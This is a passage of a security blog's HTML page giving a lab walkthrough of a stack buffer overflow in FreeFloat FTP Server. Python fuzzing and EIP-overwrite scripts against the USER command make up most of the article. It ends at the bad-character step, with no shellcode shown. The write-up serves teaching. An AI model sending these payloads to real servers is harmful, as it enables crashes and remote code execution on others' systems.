@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        FreeFloat FTP Buffer Overflow 🪣💦 ::
+        bhavsec — portfolio &amp; blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="In this writeup i&amp;rsquo;ll demonstrate how to exploit Buffer Overflow in FreeFloat FTP Server on windows. The vulnerable application is can be downloaded from Here.
+The Freefloat FTP Server has many vulnerable parameters which can be useful to practice and we will choose one of them here to do a full exercise.
+ Lab details Victim Machine: Windows XP SP1 x64 2003
+Application: FreeFloat Ftp Server (Version 1.00)
+Attacker Machine: Kali Linux 2021."
+/>
+<meta
+  name="keywords"
+  content="bhavsec, cybersecurity, penetration testing"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://bhavsec.com/posts/buff-freefloatftp/" />
+
+
+
+
+
+<link rel="stylesheet" href="../../assets/style.css" />
+
+<link rel="stylesheet" href="../../style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="../../img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="../../img/favicon.png" />
+
+
+<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
+
+<meta name="twitter:title" content="FreeFloat FTP Buffer Overflow 🪣💦"/>
+<meta name="twitter:description" content="In this writeup i&rsquo;ll demonstrate how to exploit Buffer Overflow in FreeFloat FTP Server on windows. The vulnerable application is can be downloaded from Here.
+The Freefloat FTP Server has many vulnerable parameters which can be useful to practice and we will choose one of them here to do a full exercise.
+ Lab details Victim Machine: Windows XP SP1 x64 2003
+Application: FreeFloat Ftp Server (Version 1.00)
+Attacker Machine: Kali Linux 2021."/>
+
+
+
+<meta property="og:title" content="FreeFloat FTP Buffer Overflow 🪣💦" />
+<meta property="og:description" content="In this writeup i&rsquo;ll demonstrate how to exploit Buffer Overflow in FreeFloat FTP Server on windows. The vulnerable application is can be downloaded from Here.
+The Freefloat FTP Server has many vulnerable parameters which can be useful to practice and we will choose one of them here to do a full exercise.
+ Lab details Victim Machine: Windows XP SP1 x64 2003
+Application: FreeFloat Ftp Server (Version 1.00)
+Attacker Machine: Kali Linux 2021." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bhavsec.com/posts/buff-freefloatftp/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-01T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-07-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+
+
+
+
+
+
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="http://bhavsec.com/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">
+      bhavsec/</span>
+    <span class="logo__text" style="color:red">posts/</span>
+    <span class="logo__cursor"></span>
+
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="../../resume">📄 resume</a></li>
+        
+      
+        
+          <li><a href="../../posts">📚 blog</a></li>
+        
+      
+        
+          <li><a href="../../whoami">🔎 whoami </a></li>
+        
+      
+        
+          <li><a href="../../resources">🚀 resources</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="../../resume">📄 resume</a></li>
+      
+    
+      
+        <li><a href="../../posts">📚 blog</a></li>
+      
+    
+      
+        <li><a href="../../whoami">🔎 whoami </a></li>
+      
+    
+      
+        <li><a href="../../resources">🚀 resources</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">FreeFloat FTP Buffer Overflow 🪣💦</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2021-07-01
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="../../tags/python/index.html">#python</a>&nbsp;
+        
+          <a href="../../tags/bufferoverflow/index.html">#bufferoverflow</a>&nbsp;
+        
+          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
+        
+          <a href="../../tags/msfvenom/index.html">#msfvenom</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+        
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="index.html#lab-details">Lab details</a></li>
+    <li><a href="index.html#getting-started">Getting Started</a></li>
+    <li><a href="index.html#step-1---discover-the-buffer-size">Step 1 - Discover the buffer size</a></li>
+    <li><a href="index.html#step-2---overwriting-eip">Step 2 - Overwriting EIP</a></li>
+    <li><a href="index.html#step-3---controlling-the-instruction-pointer">Step 3 - Controlling the instruction pointer</a></li>
+    <li><a href="index.html#step-4---identify-bad-characters">Step 4 - Identify Bad Characters</a></li>
+    <li><a href="index.html#step-5---finding-jmp-esp">Step 5 - Finding JMP ESP</a></li>
+    <li><a href="index.html#step-6---generating-the-exploit-in-shellcode">Step 6 - Generating the exploit in Shellcode</a></li>
+  </ul>
+</nav></aside>
+        
+      
+      <p>In this writeup i&rsquo;ll demonstrate how to exploit Buffer Overflow in FreeFloat FTP Server on windows. The vulnerable application is can be downloaded from <a href="https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip">Here</a>.</p>
+<p>The Freefloat FTP Server has many vulnerable parameters which can be useful to practice and we will choose one of them here to do a full exercise.</p>
+<p> </p>
+<h2 id="lab-details">Lab details</h2>
+<p>Victim Machine: Windows XP SP1 x64 2003</p>
+<p>Application: FreeFloat Ftp Server (Version 1.00)</p>
+<p>Attacker Machine: Kali Linux 2021.2</p>
+<p> </p>
+<h2 id="getting-started">Getting Started</h2>
+<p>Run the application in the Windows machine. By double clicking the .exe file.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/1.png" alt=""></p>
+<p>Make sure it is in running state. You can verify that by running netstat command</p>
+<pre><code>netstat -ano | FINDSTR 21
+</code></pre><p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/2.png" alt=""></p>
+<p>From a remote machine you can run nmap to enumerate the service.</p>
+<pre><code>nmap -sC -sV -p21 192.168.2.250
+</code></pre><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 22:58 EDT
+Nmap scan report for 192.168.2.250
+Host is up (0.00040s latency).
+
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+MAC Address: 00:0C:29:8E:FA:9F (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
+</code></pre><p>You can also test the application by connecting to it via netcat.</p>
+<pre><code>nc 192.168.2.250 21
+</code></pre><pre><code>220 FreeFloat Ftp Server (Version 1.00).
+USER anonymous
+331 Password required for anonymous.
+PASS anonymous
+230 User anonymous logged in.
+</code></pre><p>There are 2 parameters which are functioning: <code>USER</code> and <code>PASS</code>. In our case we will use <code>USER</code> parameter to exploit the application.</p>
+<p> </p>
+<h2 id="step-1---discover-the-buffer-size">Step 1 - Discover the buffer size</h2>
+<p>We will use this code to discover the size of the buffer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#75715e"># While true increase the variable FUZZ by adding 10 &#34;A&#34; until the program crashes</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    FUZZ <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
+    print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+    connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+    s<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Here we can see that the script stopped at 240 bytes. It could be different for your machine.</p>
+<pre><code>python3 step_1.py  
+</code></pre><pre><code>Fuzzing with 10 bytes
+Fuzzing with 20 bytes
+Fuzzing with 30 bytes
+Fuzzing with 40 bytes
+Fuzzing with 50 bytes
+Fuzzing with 60 bytes
+Fuzzing with 70 bytes
+Fuzzing with 80 bytes
+Fuzzing with 90 bytes
+Fuzzing with 100 bytes
+Fuzzing with 110 bytes
+Fuzzing with 120 bytes
+Fuzzing with 130 bytes
+Fuzzing with 140 bytes
+Fuzzing with 150 bytes
+Fuzzing with 160 bytes
+Fuzzing with 170 bytes
+Fuzzing with 180 bytes
+Fuzzing with 190 bytes
+Fuzzing with 200 bytes
+Fuzzing with 210 bytes
+Fuzzing with 220 bytes
+Fuzzing with 230 bytes
+Fuzzing with 240 bytes
+
+</code></pre><p>If we actually look at the Windows machine, we can see the application crashed.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/3.png" alt=""></p>
+<p> </p>
+<h2 id="step-2---overwriting-eip">Step 2 - Overwriting EIP</h2>
+<p>Restart the application and attach/open with Immunity Debugger</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/4.png" alt=""></p>
+<p>Now that we know the maximum stack size is 240, we can modify our script to send those in just one packet. Lets try to run again, and see the Stack showing the multiple “A”, The stack is filled with the junk value as expected, after the program crashes. This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">250</span>
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+</code></pre></div><p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/5.png" alt=""></p>
+<p>Now look at Immunity debugger console and after the crash a similar message should be shown, that [41414141], is the EIP register, which has been overwritten and the instruction is not found.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/6.png" alt=""></p>
+<p>If we look at the EIP register it is now 41414141, which means, AAAA. At this point we know that the EIP instruction pointer can be controlled.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/7.png" alt=""></p>
+<p> </p>
+<h2 id="step-3---controlling-the-instruction-pointer">Step 3 - Controlling the instruction pointer</h2>
+<p>In this phase, we will control the instruction pointer by calculating the exact offset of the EIP register. First of all, we need to create a pattern using Metasploit pattern_create.rb script.</p>
+<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 250
+</code></pre><p>Pattern generated by pattern_create.rb script.</p>
+<pre><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
+</code></pre><p>We need to modify the script a little bit to add this new value.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A&#34;</span>
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes of pattern&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Run FTP Server again and inspect Immunity debugger, EIP value. We have <code>37684136</code> EIP Register Value.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/8.png" alt=""></p>
+<p>Access violation and EIP register value showing on bottom bar.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/9.png" alt=""></p>
+<p>Now that we have located the pattern in EIP, we need to find the position within those <code>250 bytes</code> generated with pattern_create.rb, for that, we will use pattern_offset.rb, in this case the result is <code>230</code></p>
+<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37684136 -l 250 
+[*] Exact match at offset 230
+</code></pre><p>We need now to edit the script to send 230 bytes as A, followed by 4 bytes as B.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> socket
+
+<span style="color:#75715e"># This script is intended the specific stack crash and 4 more characters to overwrite the EIP</span>
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">230</span>
+EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> EIP<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+
+</code></pre></div><p>If we run BoF-Freefloat-4.py, we will notice that the EIP register value is now 42424242, which means, BBBB</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/10.png" alt=""></p>
+<p> </p>
+<h2 id="step-4---identify-bad-characters">Step 4 - Identify Bad Characters</h2>
+<p>Below we have the list of badchars, keep in mind that <code>\x00</code> is always a badchar.</p>
+<pre><code>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+</code></pre><p>We need to include that into the script and identify each of the characters not allowed. For that use this code, run it and check in Immunity Debugger.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> socket
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">230</span>
+EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+BADCHARS <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>)
+
+print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(FUZZ)))
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+connect <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.2.250&#34;</span>, <span style="color:#ae81ff">21</span>))
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;USER &#34;</span> <span style="color:#f92672">+</span> FUZZ<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> EIP<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> BADCHARS <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>close()
+
+</code></pre></div><p>Once it’s been run, In the stack section locate the ASCII conversion, where all the As are shown, right click it and select “Follow in Dump”</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/11.png" alt=""></p>
+<p>The “follow in dump” will locate the data in the hexadecimal section, so we can easily check for the absence of characters or where characters don’t follow the sequence, those mean bad characters.</p>
+<p><img src="http://bhavsec.com/img/posts/buff-freefloatftp/12.png" alt=""></p>
+<p>In this image we can see <code>01 02 03 04 05 06 07 08 09 00 0E</code>. It should be <code>01 02 03 04 05 06 07 08 09 0B 0C 0D 0E</code>, this means that <code>\x0b</code> in our code needs to be removed. We need to keep doing the same until all Bad Characters are removed.</p>
+<p>In this process we also identified <code>\x0d</code> as a bad character. After removing all the bad characters, this is the code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
+
+<span style="color:#75715e"># removing all the badchars \00 \x0a \x0d</span>
+
+FUZZ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">230</span>
+EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+BADCHARS <span style="color:#f92672">=</span> (
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span style="color:#e6db74">&#34;</span>
